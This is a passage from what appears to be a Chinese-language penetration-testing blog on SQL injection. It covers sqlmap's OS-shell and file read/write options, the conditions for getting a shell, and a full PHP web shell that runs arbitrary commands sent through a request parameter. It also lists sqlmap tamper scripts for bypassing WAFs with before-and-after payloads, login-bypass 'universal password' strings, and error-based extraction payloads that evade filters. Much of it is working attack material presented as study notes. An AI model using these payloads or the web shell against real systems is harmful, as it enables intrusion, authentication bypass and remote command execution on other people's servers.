sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--os-cmd</span></span><br><span class="line"><span class="comment">--os-shell</span></span><br><span class="line"># 运行任意操作系统命令</span><br></pre></td></tr></table></figure><blockquote><p>当数据库为MySQL、PostgreSQL或SQLserver且当前用户具有权限使用特定函数时该指令生效，但实现的原理有所不同。</p></blockquote><blockquote><p>数据库为MySQL和PostgreSQL时，sqlmap商户餐一个二进制库，包含用户自定义的函数<code>sys_exec()</code>和<code>sys_eval()</code>这两个函数可以执行系统命令。在Microsoft SQL Server中，sqlmap使用xp_cmdshell存储过程，如果被禁用（2005及以上版本默认禁用），sqlmap会重新启用它，如果不存在则会被创建。</p></blockquote><blockquote><p>–os-shell 参数可以模拟一个真实的Shell，当不能执行多语句时，仍可以使用INTO OUTFILE写进可写目录，创建一个Web后门。–os-shell支持ASP、ASP.NET、JSP和PHP四种语言。（要执行改参数，需要有数据库管理员权限，–is-dba为True）</p></blockquote><p><strong>–os-shell的利用执行条件三个：</strong></p><p>（1）网站必须是root权限</p><p>（2）攻击者需要知道网站的绝对路径</p><p>（3）GPC为off，php主动转义的功能关闭</p><p><strong>Sqlmap getshell的条件</strong></p><p>1.网站必须是root权限<br>2.知道网站的绝对路径    </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py <span class="operator">-</span>u &quot;&quot; <span class="comment">--sql-shell</span></span><br><span class="line"># 进入交互环境 输入</span><br><span class="line"><span class="keyword">select</span> @<span class="variable">@datadir</span></span><br></pre></td></tr></table></figure><blockquote><p><strong>常见找绝对路径方法：</strong><br>1.网页报错信息<br>2.Phpinfo，探针<br>3.数据库查询，暴力破解</p></blockquote><p>3.PHP关闭魔术引号，php主动转义功能关闭</p><blockquote><p>magic_quotes_gpc=Off</p></blockquote><p>4.secure_file_priv=值为空：secure_file_priv参数是用来限制LOAD DATA,SELECT…OUTFILE,and LOAD_FILE()传到哪个指定目录的</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">global</span> variables <span class="keyword">like</span> <span class="string">&#x27;%secure%&#x27;</span>;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/09/14/1l5QK3nSi4gsTJ8.png" alt="image-20210914201258493"></p><p>如果是为空，说明MYSQL默认没有secure_file_priv参数，因此在mysql-ini进行添加配置<br>添加语句secure_file_priv= 即可</p><p><strong>测试：</strong></p><ol><li><p>选择网站语言</p></li><li><p>输入绝对网站路径</p><p><img src="https://i.loli.net/2021/09/14/9YVNqXBnvTbx5CI.png" alt="image-20210914201722412"></p></li><li><p>进入 os-shell&gt; 交互环境</p><p>查看网站根目录，发现生成文件</p><p><img src="https://i.loli.net/2021/09/14/E7ovFR3PHLxKX29.png" alt="image-20210914201644753"></p><p>原理：用into outfile 函数将一个可以用来上传文件的 php 文件写到网站的根目录下</p></li><li><p>然后利用该上传脚本我们可以上传木马文件，进行访问，蚁剑链接，getshell</p><p>sqlmap 会自动利用上传文件上传一个恶意文件，该文件可以用来执行系统命令，并将结果返回，则我们可以在交互环境下，进行命令执行。</p></li></ol><p><a href="http://www.qishunwang.net/news_show_47793.aspx">http://www.qishunwang.net/news_show_47793.aspx</a></p><p><a href="https://www.cnblogs.com/zzjdbk/p/13951047.html">https://www.cnblogs.com/zzjdbk/p/13951047.html</a></p><p>该上传文件页面如下：</p><p><img src="https://i.loli.net/2021/09/14/L8HBnzFbcZRwMNx.png" alt="image-20210914202116561"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_REQUEST</span>[<span class="string">&quot;cmd&quot;</span>];</span><br><span class="line">@set_time_limit(<span class="number">0</span>);</span><br><span class="line">@ignore_user_abort(<span class="number">1</span>);</span><br><span class="line">@ini_set(<span class="string">&#x27;max_execution_time&#x27;</span>,<span class="number">0</span>);</span><br><span class="line"><span class="variable">$z</span>=@ini_get(<span class="string">&#x27;disable_functions&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$z</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$z</span>=preg_replace(<span class="string">&#x27;/[, ]+/&#x27;</span>,<span class="string">&#x27;,&#x27;</span>,<span class="variable">$z</span>);</span><br><span class="line">    <span class="variable">$z</span>=explode(<span class="string">&#x27;,&#x27;</span>,<span class="variable">$z</span>);</span><br><span class="line">    <span class="variable">$z</span>=array_map(<span class="string">&#x27;trim&#x27;</span>,<span class="variable">$z</span>);&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$z</span>=<span class="keyword">array</span>();</span><br><span class="line">        &#125;</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$c</span>.<span class="string">&quot; 2&gt;&amp;1\n&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"><span class="variable">$n</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;<span class="keyword">global</span> <span class="variable">$z</span>;</span><br><span class="line"><span class="keyword">return</span> is_callable(<span class="variable">$n</span>)<span class="keyword">and</span>!in_array(<span class="variable">$n</span>,<span class="variable">$z</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(f(<span class="string">&#x27;system&#x27;</span>))</span><br><span class="line">&#123;ob_start();</span><br><span class="line">system(<span class="variable">$c</span>);</span><br><span class="line"><span class="variable">$w</span>=ob_get_contents();</span><br><span class="line">ob_end_clean();</span><br><span class="line">&#125;<span class="keyword">elseif</span>(f(<span class="string">&#x27;proc_open&#x27;</span>))&#123;</span><br><span class="line">    <span class="variable">$y</span>=proc_open(<span class="variable">$c</span>,<span class="keyword">array</span>(<span class="keyword">array</span>(pipe,r),<span class="keyword">array</span>(pipe,w),<span class="keyword">array</span>(pipe,w)),<span class="variable">$t</span>);</span><br><span class="line">    <span class="variable">$w</span>=<span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">while</span>(!feof(<span class="variable">$t</span>[<span class="number">1</span>]))&#123;</span><br><span class="line">        <span class="variable">$w</span>.=fread(<span class="variable">$t</span>[<span class="number">1</span>],<span class="number">512</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        @proc_close(<span class="variable">$y</span>);</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">elseif</span>(f(<span class="string">&#x27;shell_exec&#x27;</span>))&#123;</span><br><span class="line">    <span class="variable">$w</span>=shell_exec(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span>(f(<span class="string">&#x27;passthru&#x27;</span>))&#123;</span><br><span class="line">        ob_start();</span><br><span class="line">        passthru(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$w</span>=ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">        &#125;<span class="keyword">elseif</span>(f(<span class="string">&#x27;popen&#x27;</span>))&#123;</span><br><span class="line">            <span class="variable">$x</span>=popen(<span class="variable">$c</span>,r);</span><br><span class="line">            <span class="variable">$w</span>=<span class="literal">NULL</span>;</span><br><span class="line">            <span class="keyword">if</span>(is_resource(<span class="variable">$x</span>))&#123;</span><br><span class="line">                <span class="keyword">while</span>(!feof(<span class="variable">$x</span>))&#123;</span><br><span class="line">                <span class="variable">$w</span>.=fread(<span class="variable">$x</span>,<span class="number">512</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    @pclose(<span class="variable">$x</span>);</span><br><span class="line">                    &#125;<span class="keyword">elseif</span>(f(<span class="string">&#x27;exec&#x27;</span>))&#123;</span><br><span class="line">                        <span class="variable">$w</span>=<span class="keyword">array</span>();</span><br><span class="line">                        exec(<span class="variable">$c</span>,<span class="variable">$w</span>);</span><br><span class="line">                        <span class="variable">$w</span>=join(chr(<span class="number">10</span>),<span class="variable">$w</span>).chr(<span class="number">10</span>);</span><br><span class="line">                        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                            <span class="variable">$w</span>=<span class="number">0</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="keyword">print</span> <span class="string">&quot;&lt;/pre&gt;&quot;</span>.<span class="variable">$w</span>.<span class="string">&quot;&lt;/pre&gt;&quot;</span>;<span class="meta">?&gt;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--file-read</span></span><br><span class="line"># 从数据库服务器中读取文件</span><br></pre></td></tr></table></figure><p>适用于MySQL、PostgreSQL或Microsoft SQL Server且当前用户有权限执行特定的函数时。读取的文件可以是文本可以是二进制文件。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py <span class="operator">-</span>u &quot;&quot; <span class="comment">--file-read &quot;路径&quot; -v 1</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--file-write --file-dest</span></span><br><span class="line"># 上传文件到数据库服务器中</span><br><span class="line"></span><br><span class="line"># file<span class="operator">-</span>write  从本地写入</span><br><span class="line"># file<span class="operator">-</span>dest  写入目标路径</span><br></pre></td></tr></table></figure><p>数据库：MySQL、PostgreSQL、Microsoft SQL Server<br>且：当前用户有权限使用特定的函数时。可以上传文本文件或二进制文件</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py <span class="operator">-</span>u &quot;http://www.xx.com/aa.aspx?id=123&quot; <span class="comment">--file-write=本地文件路径 --file-dest 网站路径(写入路径)+&quot;/写入的文件名&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sqlmap.py <span class="operator">-</span>u &quot;http://www.xx.com/aa.aspx?id=123&quot; <span class="comment">--file-write=F:/a.aspx --file-dest D:/虚拟目录/Front/cx.aspx</span></span><br></pre></td></tr></table></figure><h3 id="17-3-–tamper"><a href="#17-3-–tamper" class="headerlink" title="17.3 –tamper"></a>17.3 –tamper</h3><p>sqlmap在默认的的情况下除了使用char()函数防止出现单引号，没有对注入的数据进行修改，还可以使用–tamper参数对数据做修改来绕过waf等设备。</p><p><a href="https://blog.csdn.net/qq_34444097/article/details/82717357">https://blog.csdn.net/qq_34444097/article/details/82717357</a></p><p>绕过脚本目录在 <code>sqlmap/tamper</code>，目前官方提供 53 个绕过脚本</p><p><img src="https://i.loli.net/2021/09/14/yh6FDGfeZTlOcqn.png" alt="image-20210914203704034"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u [url] <span class="comment">--tamper [模块名]</span></span><br></pre></td></tr></table></figure><p>可以使用–identify-waf对一些网站是否有安全防护进行试探</p><p>0x02 常用tamper脚本<br>apostrophemask.py<br>适用数据库：ALL<br>作用：将引号替换为utf-8，用于过滤单引号<br>使用脚本前：tamper(“1 AND ‘1’=’1”)<br>使用脚本后：1 AND %EF%BC%871%EF%BC%87=%EF%BC%871</p><p>base64encode.py<br>适用数据库：ALL<br>作用：替换为base64编码<br>使用脚本前：tamper(“1’ AND SLEEP(5)#”)<br>使用脚本后：MScgQU5EIFNMRUVQKDUpIw==</p><p>multiplespaces.py<br>适用数据库：ALL<br>作用：围绕sql关键字添加多个空格<br>使用脚本前：tamper(‘1 UNION SELECT foobar’)<br>使用脚本后：1 UNION SELECT foobar</p><p>space2plus.py<br>适用数据库：ALL<br>作用：用加号替换空格<br>使用脚本前：tamper(‘SELECT id FROM users’)<br>使用脚本后：SELECT+id+FROM+users</p><p>nonrecursivereplacement.py<br>适用数据库：ALL<br>作用：作为双重查询语句，用双重语句替代预定义的sql关键字（适用于非常弱的自定义过滤器，例如将select替换为空）<br>使用脚本前：tamper(‘1 UNION SELECT 2–’)<br>使用脚本后：1 UNIOUNIONN SELESELECTCT 2–</p><p>space2randomblank.py<br>适用数据库：ALL<br>作用：将空格替换为其他有效字符<br>使用脚本前：tamper(‘SELECT id FROM users’)<br>使用脚本后：SELECT%0Did%0DFROM%0Ausers</p><p>unionalltounion.py<br>适用数据库：ALL<br>作用：将union allselect 替换为unionselect<br>使用脚本前：tamper(‘-1 UNION ALL SELECT’)<br>使用脚本后：-1 UNION SELECT</p><p>securesphere.py<br>适用数据库：ALL<br>作用：追加特定的字符串<br>使用脚本前：tamper(‘1 AND 1=1’)<br>使用脚本后：1 AND 1=1 and ‘0having’=’0having’</p><p>space2dash.py<br>适用数据库：ALL<br>作用：将空格替换为–，并添加一个随机字符串和换行符<br>使用脚本前：tamper(‘1 AND 9227=9227’)<br>使用脚本后：1–nVNaVoPYeva%0AAND–ngNvzqu%0A9227=9227</p><p>space2mssqlblank.py<br>适用数据库：Microsoft SQL Server<br>测试通过数据库：Microsoft SQL Server 2000、Microsoft SQL Server 2005<br>作用：将空格随机替换为其他空格符号(‘%01’, ‘%02’, ‘%03’, ‘%04’, ‘%05’, ‘%06’, ‘%07’, ‘%08’, ‘%09’, ‘%0B’, ‘%0C’, ‘%0D’, ‘%0E’, ‘%0F’, ‘%0A’)<br>使用脚本前：tamper(‘SELECT id FROM users’)<br>使用脚本后：SELECT%0Eid%0DFROM%07users</p><p>between.py<br>测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0<br>作用：用NOT BETWEEN 0 AND #替换&gt;<br>使用脚本前：tamper(‘1 AND A &gt; B–’)<br>使用脚本后：1 AND A NOT BETWEEN 0 AND B–</p><p>percentage.py<br>适用数据库：ASP<br>测试通过数据库：Microsoft SQL Server 2000, 2005、MySQL 5.1.56, 5.5.11、PostgreSQL 9.0<br>作用：在每个字符前添加一个%<br>使用脚本前：tamper(‘SELECT FIELD FROM TABLE’)<br>使用脚本后：%S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E</p><p>sp_password.py<br>适用数据库：MSSQL<br>作用：从T-SQL日志的自动迷糊处理的有效载荷中追加sp_password<br>使用脚本前：tamper(‘1 AND 9227=9227– ‘)<br>使用脚本后：1 AND 9227=9227– sp_password</p><p>charencode.py<br>测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0<br>作用：对给定的payload全部字符使用url编码（不处理已经编码的字符）<br>使用脚本前：tamper(‘SELECT FIELD FROM%20TABLE’)<br>使用脚本后：%53%45%4C%45%43%54%20%46%49%45%4C%44%20%46%52%4F%4D%20%54%41%42%4C%45</p><p>randomcase.py<br>测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0<br>作用：随机大小写<br>使用脚本前：tamper(‘INSERT’)<br>使用脚本后：INseRt</p><p>charunicodeencode.py<br>适用数据库：ASP、ASP.NET<br>测试通过数据库：Microsoft SQL Server 2000/2005、MySQL 5.1.56、PostgreSQL 9.0.3<br>作用：适用字符串的unicode编码<br>使用脚本前：tamper(‘SELECT FIELD%20FROM TABLE’)<br>使用脚本后：%u0053%u0045%u004C%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004C%u0044%u0020%u0046%u0052%u004F%u004D%u0020%u0054%u0041%u0042%u004C%u0045</p><p>space2comment.py<br>测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0<br>作用：将空格替换为/<strong>/<br>使用脚本前：tamper(‘SELECT id FROM users’)<br>使用脚本后：SELECT/</strong>/id/<strong>/FROM/</strong>/users</p><p>equaltolike.py<br>测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5<br>作用：将=替换为LIKE<br>使用脚本前：tamper(‘SELECT * FROM users WHERE id=1’)<br>使用脚本后：SELECT * FROM users WHERE id LIKE 1</p><p>equaltolike.py<br>测试通过数据库：MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0<br>作用：将&gt;替换为GREATEST，绕过对&gt;的过滤<br>使用脚本前：tamper(‘1 AND A &gt; B’)<br>使用脚本后：1 AND GREATEST(A,B+1)=A</p><p>ifnull2ifisnull.py<br>适用数据库：MySQL、SQLite (possibly)、SAP MaxDB (possibly)<br>测试通过数据库：MySQL 5.0 and 5.5<br>作用：将类似于IFNULL(A, B)替换为IF(ISNULL(A), B, A)，绕过对IFNULL的过滤<br>使用脚本前：tamper(‘IFNULL(1, 2)’)<br>使用脚本后：IF(ISNULL(1),2,1)</p><p>modsecurityversioned.py<br>适用数据库：MySQL<br>测试通过数据库：MySQL 5.0<br>作用：过滤空格，使用mysql内联注释的方式进行注入<br>使用脚本前：tamper(‘1 AND 2&gt;1–’)<br>使用脚本后：1 /<em>!30874AND 2&gt;1</em>/–</p><p>space2mysqlblank.py<br>适用数据库：MySQL<br>测试通过数据库：MySQL 5.1<br>作用：将空格替换为其他空格符号(‘%09’, ‘%0A’, ‘%0C’, ‘%0D’, ‘%0B’)<br>使用脚本前：tamper(‘SELECT id FROM users’)<br>使用脚本后：SELECT%0Bid%0DFROM%0Cusers</p><p>modsecurityzeroversioned.py<br>适用数据库：MySQL<br>测试通过数据库：MySQL 5.0<br>作用：使用内联注释方式（/<em>!00000</em>/）进行注入<br>使用脚本前：tamper(‘1 AND 2&gt;1–’)<br>使用脚本后：1 /<em>!00000AND 2&gt;1</em>/–</p><p>space2mysqldash.py<br>适用数据库：MySQL、MSSQL<br>作用：将空格替换为 – ，并追随一个换行符<br>使用脚本前：tamper(‘1 AND 9227=9227’)<br>使用脚本后：1–%0AAND–%0A9227=9227</p><p>bluecoat.py<br>适用数据库：Blue Coat SGOS<br>测试通过数据库：MySQL 5.1,、SGOS<br>作用：在sql语句之后用有效的随机空白字符替换空格符，随后用LIKE替换=<br>使用脚本前：tamper(‘SELECT id FROM users where id = 1’)<br>使用脚本后：SELECT%09id FROM users where id LIKE 1</p><p>versionedkeywords.py<br>适用数据库：MySQL<br>测试通过数据库：MySQL 4.0.18, 5.1.56, 5.5.11<br>作用：注释绕过<br>使用脚本前：tamper(‘1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,100,114,117,58))#’)<br>使用脚本后：1/<em>!UNION</em>//<em>!ALL</em>//<em>!SELECT</em>//<em>!NULL</em>/,/<em>!NULL</em>/, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER()/<em>!AS</em>//<em>!CHAR</em>/),CHAR(32)),CHAR(58,100,114,117,58))#</p><p>halfversionedmorekeywords.py<br>适用数据库：MySQL &lt; 5.1<br>测试通过数据库：MySQL 4.0.18/5.0.22<br>作用：在每个关键字前添加mysql版本注释<br>使用脚本前：tamper(“value’ UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND ‘QDWa’=’QDWa”)<br>使用脚本后：value’/<em>!0UNION/</em>!0ALL/<em>!0SELECT/</em>!0CONCAT(/<em>!0CHAR(58,107,112,113,58),/</em>!0IFNULL(CAST(/<em>!0CURRENT_USER()/</em>!0AS/<em>!0CHAR),/</em>!0CHAR(32)),/<em>!0CHAR(58,97,110,121,58)),/</em>!0NULL,/<em>!0NULL#/</em>!0AND ‘QDWa’=’QDWa</p><p>space2morehash.py<br>适用数据库：MySQL &gt;= 5.1.13<br>测试通过数据库：MySQL 5.1.41<br>作用：将空格替换为#，并添加一个随机字符串和换行符<br>使用脚本前：tamper(‘1 AND 9227=9227’)<br>使用脚本后：1%23ngNvzqu%0AAND%23nVNaVoPYeva%0A%23lujYFWfv%0A9227=9227</p><p>apostrophenullencode.py<br>适用数据库：ALL<br>作用：用非法双字节Unicode字符替换单引号<br>使用脚本前：tamper(“1 AND ‘1’=’1”)<br>使用脚本后：1 AND %00%271%00%27=%00%271</p><p>appendnullbyte.py<br>适用数据库：ALL<br>作用：在有效载荷的结束位置加载null字节字符编码<br>使用脚本前：tamper(‘1 AND 1=1’)<br>使用脚本后：1 AND 1=1%00</p><p>chardoubleencode.py<br>适用数据库：ALL<br>作用：对给定的payload全部字符使用双重url编码（不处理已经编码的字符）<br>使用脚本前：tamper(‘SELECT FIELD FROM%20TABLE’)<br>使用脚本后：%2553%2545%254C%2545%2543%2554%2520%2546%2549%2545%254C%2544%2520%2546%2552%254F%254D%2520%2554%2541%2542%254C%2545</p><p>unmagicquotes.py<br>适用数据库：ALL<br>作用：用一个多字节组合%bf%27和末尾通用注释一起替换空格<br>使用脚本前：tamper(“1’ AND 1=1”)<br>使用脚本后：1%bf%27 AND 1=1–</p><p>randomcomments.py<br>适用数据库：ALL<br>作用：用注释符分割sql关键字<br>使用脚本前：tamper(‘INSERT’)<br>使用脚本后：I/<strong>/N/</strong>/SERT</p><p>在熟悉了tamper脚本之后，我们应该学习tamper绕过脚本的编写规则，来应对复杂的实际环境。</p><h2 id="十八、绕过姿势-str-replace"><a href="#十八、绕过姿势-str-replace" class="headerlink" title="十八、绕过姿势   str_replace()"></a>十八、绕过姿势   <code>str_replace()</code></h2><p><strong>任何的表名、数据库名都可以使用十六进制代替</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%df<span class="string">&#x27; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema= 0x7365637572697479),3--+</span></span><br></pre></td></tr></table></figure><p><strong>万能密码</strong>：<code>$sql=&quot;select * from test where username=&#39; XX &#39; and password=&#39; XX &#39; &quot;;</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 不知用户名时</span></span><br><span class="line"><span class="string">&#x27; or 1--+# 注释闭合</span></span><br><span class="line"><span class="string">&#x27;</span> or <span class="string">&#x27;1&#x27;</span>=<span class="string">&#x27;1# 手动闭合</span></span><br><span class="line"><span class="string">&#x27;</span> or <span class="string">&#x27;1&#x27;</span>=<span class="string">&#x27;1&#x27;</span><span class="comment">## 使用了注释#</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 知道一个用户名</span></span><br><span class="line">admin<span class="string">&#x27; or &#x27;</span>1<span class="string">&#x27;=&#x27;</span>1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 可尝试</span></span><br><span class="line">1<span class="string">&#x27;or(1)#</span></span><br></pre></td></tr></table></figure><p><strong>过滤 注释</strong>：</p><p>法一：截断 <code>;%00</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">;%00</span><br><span class="line">?id=1<span class="string">&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1);%00</span></span><br></pre></td></tr></table></figure><p>法二：手动闭合</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&#x27;and&#x27;</span>1<span class="string">&#x27;=&#x27;</span>1</span><br><span class="line">?id=1<span class="string">&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1)and&#x27;</span>1<span class="string">&#x27;=&#x27;</span>1</span><br></pre></td></tr></table></figure><p><strong>过滤空格</strong>：</p><p>括号包围：对于一些字段名可使用括号包围</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1<span class="string">&#x27;||updatexml(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=&#x27;</span>security<span class="string">&#x27;)),0x7e),1);%0</span></span><br></pre></td></tr></table></figure><p>字符编码绕过：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 可以绕过空格的编码：</span></span><br><span class="line">%09  Tab键-水平</span><br><span class="line">%0a  换行</span><br><span class="line">%0c  换页</span><br><span class="line">%0b  Tab键-垂直</span><br><span class="line">%0d</span><br><span class="line">%00</span><br><span class="line">%a0  在特定字符集才可使用</span><br><span class="line"><span class="comment"># 特殊的 </span></span><br><span class="line">/**/</span><br></pre></td></tr></table></figure><p><strong>大小写绕过：</strong></p><p>Mysql 中，关键字是不区分大小写的，如果仅仅是过滤了 <code>select </code> ，那么我们可以使用 <code>SelECt</code> ，进行大小写混写绕过。</p><p><strong>正则匹配：</strong></p><p>正则如果匹配 <code>\bselect\b</code>  ，我们可以使用 <code>/*!50000select*/</code> 绕过。</p><p><img src="https://i.loli.net/2021/08/20/8BtLSruRD7nsIdp.png" alt="image-20210820224913933"></p><p><strong>一次过滤：双写绕过</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span>=preg_replace(<span class="string">&#x27;/or/i&#x27;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$id</span>=preg_replace(<span class="string">&#x27;/and/i&#x27;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$id</span>=preg_replace(<span class="string">&#x27;/select/i&#x27;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$id</span>);</span><br></pre></td></tr></table></figure><p><strong>and  or  过滤：双写绕过，或者是 &amp;&amp;–&gt;%26%26  ||–&gt;%7c%7c</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=1<span class="string">&#x27;||updatexml(1,concat(0x7e,database(),0x7e),1);%00</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=1&#x27;</span>||updatexml(1,concat(0x7e,database(),0x7e),1)||<span class="string">&#x27;1&#x27;</span>=<span class="string">&#x27;1</span></span><br></pre></td></tr></table></figure><p><strong>过滤了单双引号，但没有过滤 反斜杠  <code>\</code></strong></p><p>例如：sql 语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;select * from nres where id=&#x27;可控参数1&#x27; and title=&#x27;可控参数2&#x27;&quot;;</span><br></pre></td></tr></table></figure><p>我们可以进行如下构造，不使用 单双引号，利用反斜杠</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">id=a\</span><br><span class="line">title=or sleep(3)<span class="comment">#</span></span><br><span class="line"><span class="comment">#这样拼起来的 sql 语句就是</span></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;select * from nres where id=&#x27;a\&#x27; and title=&#x27;or sleep(3)#&#x27;&quot;</span>;</span><br><span class="line"><span class="comment"># 如此，or sleep(3)# 便成了一个整体，将会成功执行后面的 sleep(3)</span></span><br></pre></td></tr></table></figure><p>使用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span 